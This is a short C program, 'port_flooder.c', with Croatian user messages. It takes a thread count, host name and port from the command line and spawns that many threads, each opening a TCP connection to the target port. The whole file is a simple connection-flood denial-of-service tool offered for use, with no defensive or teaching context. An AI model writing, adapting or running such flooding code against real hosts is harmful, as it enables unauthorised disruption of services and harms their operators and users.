/* port_flooder.c - floods a given port on host
 * (C) 2005 Igor Pozgaj <ipozgaj@fly.srk.fer.hr>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <pthread.h>

#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>

char *hostname = NULL; //nx6800
int port_num = 0;
int verbose = 1;

void *thread (void *param)
{
	int socket_fd;
	struct sockaddr_in name;
	struct hostent *hostinfo;

	socket_fd = socket (AF_INET, SOCK_STREAM, 0);
	name.sin_family = AF_INET;

	if ((hostinfo = gethostbyname (hostname)) == 0) {
		fprintf (stderr, "Ne mogu resolvati hostname\n");
		exit (EXIT_FAILURE);
	}
	
	name.sin_addr = *((struct in_addr *) hostinfo->h_addr);
	name.sin_port = htons (port_num);

	if (verbose)
		printf ("Pokrenuta nit: %d\n", *((int *) param));

	if (connect (socket_fd, &name, sizeof (struct sockaddr_in)) == -1)
		perror ("connect");
}

int main (int argc, char **argv)
{
	int i, num_threads, *thread_idn;
	pthread_t *thread_id;

	if (argc != 4) {
		fprintf (stderr, "Sintaksa: flood broj_poruka hostname port\n");
		exit (EXIT_FAILURE);
	}

	num_threads = atoi (argv[1]);
	hostname = strdup (argv[2]);
	port_num = atoi (argv[3]);

	thread_id = malloc (sizeof (pthread_t) * num_threads);
	thread_idn = malloc (sizeof (int) * num_threads);

	for (i=0 ; i<num_threads ; ++i) {
		thread_idn[i] = i + 1;
		pthread_create (&thread_id[i], NULL, &thread, (void *) &thread_idn[i]);
	}

	sleep (5);

	return 0;
}

